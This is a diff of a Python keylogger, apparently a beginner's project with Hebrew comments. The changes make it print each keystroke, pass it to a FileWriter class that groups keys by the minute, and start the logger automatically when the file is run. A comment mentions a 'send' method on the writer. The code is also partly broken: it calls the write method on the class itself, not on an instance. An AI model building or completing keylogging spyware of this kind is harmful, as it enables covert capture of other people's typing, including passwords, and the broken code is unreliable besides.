@@ -8,8 +8,9 @@ class KeyLogger:
     def __init__(self):
         # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
         def __on_press(Key):
-            key_nise = self.nurmal_key(key)
-            (key_nise)
+            key_nise = self.nurmal_key(Key)
+            print(key_nise)
+            FileWriter.write(key_nise)
 
         def on_release(key):
             try:
@@ -24,6 +25,7 @@ class KeyLogger:
             listener.join()
 
     # אחראי ליפות את המקש
+    @staticmethod
     def nurmal_key(key):
             key_nise = str(key)
             key_list = list(key_nise)
@@ -41,7 +43,7 @@ class KeyLogger:
             else:
                 return key_list[1]
 
-
+KeyLogger()
 
 
 
@@ -57,10 +59,10 @@ class Writer(ABC):
 
 #  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
 class FileWriter(Writer):
-    def __init__(self, file_path):
+    def __init__(self):
         self.text_dict = {}
         self.cur_min = datetime.now().strftime('%Y-%m-%d %H:%M')
-        self.file_path = file_path
+        # self.file_path = file_path
     def write(self, key: str):
         if self.cur_min not in self.text_dict:
             self.text_dict[self.cur_min] = key
